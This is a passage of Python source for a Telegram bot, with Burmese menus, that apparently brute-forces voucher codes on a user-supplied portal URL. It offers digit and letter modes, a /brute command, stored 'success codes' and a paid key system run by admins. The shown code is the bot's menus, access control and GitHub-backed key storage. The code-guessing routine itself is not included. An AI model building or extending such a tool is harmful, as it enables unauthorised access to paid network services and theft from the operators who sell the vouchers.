                    text="🔗 ကျေးဇူးပြု၍ Portal URL ကိုအရင်ထည့်သွင်းပါ:\n\n/setup [your_portal_url]",
                    reply_markup=self.get_back_keyboard()
                )
                await self.bot.answer_callback_query(call.id)
                return

            if chat_id in self.scan_tasks and self.scan_tasks[chat_id].task and not self.scan_tasks[chat_id].task.done():
                await self.bot.edit_message_text(
                    chat_id=chat_id,
                    message_id=call.message.message_id,
                    text="Scan သည် အလုပ်လုပ်နေပြီဖြစ်သည်။ STOP SCAN ခလုတ်ဖြင့် ရပ်တန့်နိုင်ပါသည်။",
                    reply_markup=self.get_scam_button_keyboard()
                )
                await self.bot.answer_callback_query(call.id)
                return

            await self.bot.edit_message_text(
                chat_id=chat_id,
                message_id=call.message.message_id,
                text=f"🔍 Scan စတင်နေပါသည်...\n\n🔢 VOUCHER Mode: {mode}\n\nSTOP SCAN ခလုတ်ဖြင့် ရပ်တန့်နိုင်ပါသည်။",
                reply_markup=self.get_scam_button_keyboard(),
                parse_mode="Markdown"
            )

            await self.start_scan(
                chat_id,
                mode,
                None,
                None,
                call.message,
                start_digit=start_digit
            )
            await self.bot.answer_callback_query(call.id)
            return

        if call.data == "menu_paid":
            text = f"""🔑 PAID USER ဖြစ်ရန်

ကျေးဇူးပြု၍ သင်၏ USER ID ကိုထည့်သွင်းပါ။

USER ID: {user_id}

✅ သင်၏ USER ID ကို Admin ထံ ပေးပို့ပြီး Key ဝယ်ယူပါ။
👨‍💻 Admin: {ADMIN_USERNAME}

Key ရရှိပြီးပါက PAID USER ဖြစ်ရန် နှိပ်ပါ"""
            await self.bot.edit_message_text(
                chat_id=chat_id,
                message_id=call.message.message_id,
                text=text,
                reply_markup=self.get_paid_keyboard()
            )
            await self.bot.answer_callback_query(call.id)
            return

        if call.data == "menu_enter_userid":
            auth_list, _ = await self.get_file_content("auth_list.json")
            if user_id in auth_list:
                valid = self.check_key_expiration(auth_list[user_id])
                if valid:
                    self.db.upsert_user(user_id, is_paid=1, is_approved=1)
                    self.user_data.setdefault(chat_id, {})
                    await self.bot.edit_message_text(
                        chat_id=chat_id,
                        message_id=call.message.message_id,
                        text=f"✅ PAID USER ဖြစ်ပါပြီ။\n\nUSER ID: {user_id}\n\nအောက်ပါ Menu မှ သင်လိုချင်တာကိုရွေးချယ်ပါ။",
                        reply_markup=self.get_main_keyboard()
                    )
                else:
                    await self.bot.edit_message_text(
                        chat_id=chat_id,
                        message_id=call.message.message_id,
                        text=f"❌ သင်၏ Key Expired ဖြစ်နေပါသည်။ ကျေးဇူးပြု၍ Admin {ADMIN_USERNAME} သို့ ဆက်သွယ်ပါ။",
                        reply_markup=self.get_back_keyboard()
                    )
            else:
                for admin_id in ADMINS:
                    try:
                        await self.bot.send_message(
                            admin_id,
                            f"🔔 New User Request:\nName: {user_name}\nID: {user_id}\n\nTo approve:\n/genkey unlimited {user_id}"
                        )
                    except Exception:
                        pass
                await self.bot.edit_message_text(
                    chat_id=chat_id,
                    message_id=call.message.message_id,
                    text=f"🙏 ကျေးဇူးပြု၍ Paid ဝယ်ယူပါ။\n\nUSER ID: {user_id}\n\nAdmin မှ သင့် ID ကို အတည်ပြုပြီးပါက PAID USER ဖြစ်ပါမည်။\n👨‍💻 Admins: {ADMIN_USERNAME}",
                    reply_markup=self.get_back_keyboard()
                )
            await self.bot.answer_callback_query(call.id)
            return

        if call.data == "menu_result":
            if not self.is_paid_or_approved(chat_id):
                await self.bot.edit_message_text(
                    chat_id=chat_id,
                    message_id=call.message.message_id,
                    text=f"❌ သင်၏ user ID ကို registered မလုပ်ရသေးပါ။\n\nPAID USER ဖြစ်ရန် Admin {ADMIN_USERNAME} သို့ ဆက်သွယ်ပါ။",
                    reply_markup=self.get_back_keyboard()
                )
                await self.bot.answer_callback_query(call.id)
                return

            success_codes = self.db.get_success_codes(user_id)
            if success_codes:
                codes = "\n".join([f"🎫 {c['code']} — {c['plan']}" for c in success_codes[:20]])
                if len(success_codes) > 20:
                    codes += f"\n... နှင့် {len(success_codes)-20} ခု ထပ်ရှိသည်။"
                text = f"✅ Found Codes:\n{codes}"
            else:
                text = "📋 သင့်တွင် ယခင်ကရရှိထားသော success code မရှိသေးပါ။"
            await self.bot.edit_message_text(
                chat_id=chat_id,
                message_id=call.message.message_id,
                text=text,
                reply_markup=self.get_back_keyboard()
            )
            await self.bot.answer_callback_query(call.id)
            return

        if call.data == "menu_recheck":
            if not self.is_paid_or_approved(chat_id):
                await self.bot.edit_message_text(
                    chat_id=chat_id,
                    message_id=call.message.message_id,
                    text=f"❌ သင်၏ user ID ကို registered မလုပ်ရသေးပါ။\n\nPAID USER ဖြစ်ရန် Admin {ADMIN_USERNAME} သို့ ဆက်သွယ်ပါ။",
                    reply_markup=self.get_back_keyboard()
                )
                await self.bot.answer_callback_query(call.id)
                return

            if chat_id not in self.user_data or 'session_url' not in self.user_data.get(chat_id, {}):
                await self.bot.edit_message_text(
                    chat_id=chat_id,
                    message_id=call.message.message_id,
                    text="🔗 ကျေးဇူးပြု၍ Portal URL ကိုအရင်ထည့်သွင်းပါ:\n\n/setup [your_portal_url]",
                    reply_markup=self.get_back_keyboard()
                )
                await self.bot.answer_callback_query(call.id)
                return

            await self.bot.edit_message_text(
                chat_id=chat_id,
                message_id=call.message.message_id,
                text="🔄 Recheck ကို စတင်နေပါသည်...",
                reply_markup=self.get_scam_button_keyboard()
            )
            await self.cmd_recheck(call.message)
            await self.bot.answer_callback_query(call.id)
            return

        if call.data == "menu_stop":
            await self.cmd_stop(call.message)
            await self.bot.answer_callback_query(call.id, "🛑 Scan ကိုရပ်တန့်လိုက်ပါပြီ။", show_alert=True)
            return

        if call.data.startswith("scan_"):
            if not self.is_paid_or_approved(chat_id):
                await self.bot.edit_message_text(
                    chat_id=chat_id,
                    message_id=call.message.message_id,
                    text=f"❌ သင်၏ user ID ကို registered မလုပ်ရသေးပါ။\n\nPAID USER ဖြစ်ရန် Admin {ADMIN_USERNAME} သို့ ဆက်သွယ်ပါ။",
                    reply_markup=self.get_back_keyboard()
                )
                await self.bot.answer_callback_query(call.id)
                return

            mode = call.data.replace("scan_", "")

            if chat_id not in self.user_data:
                self.user_data[chat_id] = {}

            if 'session_url' not in self.user_data[chat_id]:
                await self.bot.edit_message_text(
                    chat_id=chat_id,
                    message_id=call.message.message_id,
                    text="🔗 ကျေးဇူးပြု၍ Portal URL ကိုအရင်ထည့်သွင်းပါ:\n\n/setup [your_portal_url]",
                    reply_markup=self.get_back_keyboard()
                )
                await self.bot.answer_callback_query(call.id)
                return

            if mode in ["6", "7", "8", "9"]:
                await self.bot.edit_message_text(
                    chat_id=chat_id,
                    message_id=call.message.message_id,
                    text=f"🔢 VOUCHER {mode} လုံးအတွက် ထိပ်စီးနံပါတ်ရွေးပါ -",
                    reply_markup=self.get_digit_keyboard(mode)
                )
                await self.bot.answer_callback_query(call.id)
                return

            self.user_data[chat_id]['selected_mode'] = mode
            self.user_data[chat_id]['start_digit'] = None

            text = f"""🔍 သင်ရွေးချယ်ထားသော VOUCHER အမျိုးအစား: {mode}

✅ START SCAM ခလုတ်ကိုနှိပ်ပြီး စတင်ပါ။
🛑 STOP SCAN ခလုတ်ဖြင့် ရပ်တန့်နိုင်ပါသည်။"""
            await self.bot.edit_message_text(
                chat_id=chat_id,
                message_id=call.message.message_id,
                text=text,
                reply_markup=self.get_start_scam_keyboard()
            )
            await self.bot.answer_callback_query(call.id)
            return

        if call.data.startswith("digit_"):
            parts = call.data.split("_")
            mode = parts[1]
            digit = parts[2]

            if chat_id not in self.user_data:
                self.user_data[chat_id] = {}
            self.user_data[chat_id]['selected_mode'] = mode
            self.user_data[chat_id]['start_digit'] = None if digit == "random" else digit

            text = f"🔍 VOUCHER Mode: {mode}\n"
            if digit == "random":
                text += "🔢 ထိပ်စီးနံပါတ်: Random ဖြင့်ရှာမည်"
            else:
                text += f"🔢 ထိပ်စီးနံပါတ်: {digit} မှစ၍ရှာမည်"

            await self.bot.edit_message_text(
                chat_id=chat_id,
                message_id=call.message.message_id,
                text=text + "\n\n✅ START SCAM ခလုတ်ကိုနှိပ်ပြီး စတင်ပါ။",
                reply_markup=self.get_start_scam_keyboard()
            )
            await self.bot.answer_callback_query(call.id)
            return

        if call.data == "resume_scan":
            p = self.last_scan_params.get(chat_id)
            if p:
                await self.start_scan(
                    chat_id,
                    p.get("mode"),
                    p.get("length"),
                    p.get("target"),
                    call.message,
                    p.get("plan_filters", []),
                    p.get("start_digit")
                )
            await self.bot.answer_callback_query(call.id)
            return

        if call.data == "new_scan":
            p = self.pending_brute.get(chat_id)
            if p:
                self.last_scan_params.pop(chat_id, None)
                await self.start_scan(
                    chat_id,
                    p.get("mode"),
                    p.get("length"),
                    p.get("target"),
                    call.message,
                    p.get("plan_filters", [])
                )
            await self.bot.answer_callback_query(call.id)
            return

    # ─────────────────────────────────────────────────────────────────────────
    # Keyboards
    # ─────────────────────────────────────────────────────────────────────────
    def get_main_keyboard(self):
        keyboard = InlineKeyboardMarkup(row_width=2)
        keyboard.add(
            InlineKeyboardButton("🎫 PAID USER", callback_data="menu_paid"),
            InlineKeyboardButton("🔗 Portal URL ထည့်ရန်", callback_data="menu_free_trial"),
            InlineKeyboardButton("📋 Success Codes ကြည့်မည်", callback_data="menu_result"),
            InlineKeyboardButton("🔄 Recheck ပြန်လုပ်စစ်မည်", callback_data="menu_recheck"),
            InlineKeyboardButton("🛑 Scan ရပ်မည်", callback_data="menu_stop"),
            InlineKeyboardButton("🔙 Back", callback_data="menu_back")
        )
        return keyboard

    def get_voucher_keyboard(self):
        keyboard = InlineKeyboardMarkup(row_width=2)
        keyboard.add(
            InlineKeyboardButton("🔢 VOUCHER 6 လုံး", callback_data="scan_6"),
            InlineKeyboardButton("🔢 VOUCHER 7 လုံး", callback_data="scan_7"),
            InlineKeyboardButton("🔢 VOUCHER 8 လုံး", callback_data="scan_8"),
            InlineKeyboardButton("🔢 VOUCHER 9 လုံး", callback_data="scan_9"),
            InlineKeyboardButton("🔤 ascii-lower", callback_data="scan_ascii-lower"),
            InlineKeyboardButton("🔤 ascii-lower 9", callback_data="scan_ascii-lower9"),
            InlineKeyboardButton("🎲 all", callback_data="scan_all"),
            InlineKeyboardButton("🔤+🔢 MIXED 6", callback_data="scan_mixed"),
            InlineKeyboardButton("🔤+🔢 MIXED 8", callback_data="scan_mixed8"),
            InlineKeyboardButton("🔤+🔢 MIXED 9", callback_data="scan_mixed9"),
            InlineKeyboardButton("🔙 Back", callback_data="menu_back")
        )
        return keyboard

    def get_digit_keyboard(self, mode):
        keyboard = InlineKeyboardMarkup(row_width=5)
        buttons = [InlineKeyboardButton(str(i), callback_data=f"digit_{mode}_{i}") for i in range(10)]
        keyboard.add(*buttons)
        keyboard.add(InlineKeyboardButton("🎲 Random", callback_data=f"digit_{mode}_random"))
        keyboard.add(InlineKeyboardButton("🔙 Back", callback_data="menu_back"))
        return keyboard

    def get_start_scam_keyboard(self):
        keyboard = InlineKeyboardMarkup(row_width=1)
        keyboard.add(
            InlineKeyboardButton("🚀 START SCAN", callback_data="menu_start_scam"),
            InlineKeyboardButton("🔙 Back", callback_data="menu_back")
        )
        return keyboard

    def get_paid_keyboard(self):
        keyboard = InlineKeyboardMarkup(row_width=1)
        keyboard.add(
            InlineKeyboardButton("✅ PAID USER ဖြစ်ရန်", callback_data="menu_enter_userid"),
            InlineKeyboardButton("🔙 Back", callback_data="menu_back")
        )
        return keyboard

    def get_back_keyboard(self):
        keyboard = InlineKeyboardMarkup(row_width=1)
        keyboard.add(InlineKeyboardButton("🔙 Back", callback_data="menu_back"))
        return keyboard

    def get_scam_button_keyboard(self):
        keyboard = InlineKeyboardMarkup(row_width=1)
        keyboard.add(
            InlineKeyboardButton("🛑 STOP SCAN", callback_data="menu_stop"),
            InlineKeyboardButton("🔙 Back", callback_data="menu_back")
        )
        return keyboard

    # ─────────────────────────────────────────────────────────────────────────
    # GitHub Helpers (Optional)
    # ─────────────────────────────────────────────────────────────────────────
    async def get_file_content(self, path):
        if not GITHUB_TOKEN or not REPO_OWNER or not REPO_NAME:
            return {}, None
        url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{path}"
        headers = {"Authorization": f"token {GITHUB_TOKEN}"}
        session = await self.get_session()
        try:
            async with session.get(url, headers=headers) as response:
                if response.status == 200:
                    data = await response.json()
                    content = base64.b64decode(data['content']).decode('utf-8')
                    return json.loads(content), data['sha']
        except Exception as e:
            log.debug(f"GitHub get_file_content error: {e}")
        return {}, None

    async def update_file_content(self, path, content, sha, message):
        if not GITHUB_TOKEN or not REPO_OWNER or not REPO_NAME:
            return
        url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{path}"
        headers = {
            "Authorization": f"token {GITHUB_TOKEN}",
            "Content-Type": "application/json"
        }
        encoded = base64.b64encode(json.dumps(content).encode()).decode()
        payload = {"message": message, "content": encoded, "sha": sha}
        session = await self.get_session()
        try:
            async with session.put(url, headers=headers, json=payload) as response:
                return await response.text()
        except Exception as e:
            log.debug(f"GitHub update_file_content error: {e}")

    def check_key_expiration(self, expiration_time):
        try:
            if isinstance(expiration_time, dict):
                expiry = expiration_time.get("expires_at")
                if expiry == "9999-12-31T23:59:59Z":
                    return True
                exp_time = datetime.fromisoformat(expiry.replace("Z", "+00:00"))
                return datetime.now(timezone.utc) < exp_time
            mm, hh, dd, MM, yyyy = map(int, expiration_time.split('-'))
            expiration_dt = datetime(year=yyyy, month=MM, day=dd, hour=hh, minute=mm, second=0, tzinfo=timezone.utc)
            return datetime.now(timezone.utc) < expiration_dt
        except Exception as e:
            log.debug(f"Key parse error: {e}")
            return False

    def generate_expiry(self, plan):
        now = datetime.now(timezone.utc)
        plans = {
            "30m": timedelta(minutes=30),
            "1h": timedelta(hours=1),
            "1d": timedelta(days=1),
            "7d": timedelta(days=7),
            "1m": timedelta(days=30),
            "1y": timedelta(days=365),
            "unlimited": None
        }
        if plan not in plans:
            return None
        if plan == "unlimited":
            return "9999-12-31T23:59:59Z"
        return (now + plans[plan]).isoformat()

    # ─────────────────────────────────────────────────────────────────────────
    # Register Handlers
    # ─────────────────────────────────────────────────────────────────────────
    def register_handlers(self):
        self.bot.message_handler(commands=['start'])(self.cmd_start)
        self.bot.message_handler(commands=['help'])(self.cmd_help)
        self.bot.message_handler(commands=['setup', 'portal'])(self.cmd_setup)
        self.bot.message_handler(commands=['brute'])(self.cmd_brute)
        self.bot.message_handler(commands=['scan'])(self.cmd_scan)
        self.bot.message_handler(commands=['stop'])(self.cmd_stop)
        self.bot.message_handler(commands=['resume'])(self.cmd_resume)
        self.bot.message_handler(commands=['saved', 'result'])(self.cmd_saved)
        self.bot.message_handler(commands=['notify'])(self.cmd_notify)
        self.bot.message_handler(commands=['recheck'])(self.cmd_recheck)
        self.bot.message_handler(commands=['status'])(self.cmd_status)
        self.bot.message_handler(commands=['genkey'])(self.cmd_genkey)
        self.bot.message_handler(commands=['verify_otp'])(self.cmd_verify_otp)
        self.bot.message_handler(commands=['delkey'])(self.cmd_delkey)
        self.bot.message_handler(commands=['listkeys'])(self.cmd_listkeys)
        self.bot.message_handler(commands=['sendall'])(self.cmd_sendall)
        self.bot.callback_query_handler(func=lambda call: True)(self.callback_handler)

    # ─────────────────────────────────────────────────────────────────────────
    # Run
    # ─────────────────────────────────────────────────────────────────────────
    async def start_polling(self):
        backoff = 5
        while True:
            try:
                await self.bot.infinity_polling(timeout=20, request_timeout=20)
                return
            except (aiohttp.ClientError, asyncio.TimeoutError) as e:
                log.error(f"Polling connection error: {e}. Reconnecting in {backoff}s...")
                await asyncio.sleep(backoff)
                backoff = min(backoff * 2, 60)
            except Exception as e:
                log.error(f"Unexpected polling error: {e}. Reconnecting in {backoff}s...")
                await asyncio.sleep(backoff)
                backoff = min(backoff * 2, 60)

    async def run(self):
        self.register_handlers()

        # Start web server
        asyncio.create_task(self.start_web_server())

        # Start GitHub update scheduler (optional)
        if GITHUB_TOKEN:
            asyncio.create_task(self.github_update_scheduler())

        await self.start_polling()

    async def start_web_server(self):
        app = web.Application()
        app.router.add_get("/", self.web_handle)
        runner = web.AppRunner(app)
        await runner.setup()
        port = int(os.environ.get("PORT", 8099))
        site = web.TCPSite(runner, "0.0.0.0", port)
        await site.start()
        log.info(f"Web server listening on port {port}")

    async def web_handle(self, request):
        return web.Response(text="Bot is awake and running 24/7!")

    async def github_update_scheduler(self):
        while True:
            await asyncio.sleep(180)
            # We don't use SUCCESS_CODE queue anymore, but keep for compatibility
            pass

# ─────────────────────────────────────────────────────────────────────────────
# Main
# ─────────────────────────────────────────────────────────────────────────────
async def main():
    bot = VoucherBot()
    try:
        await bot.run()
    finally:
        await bot.close_session()

if __name__ == "__main__":
    asyncio.run(main())
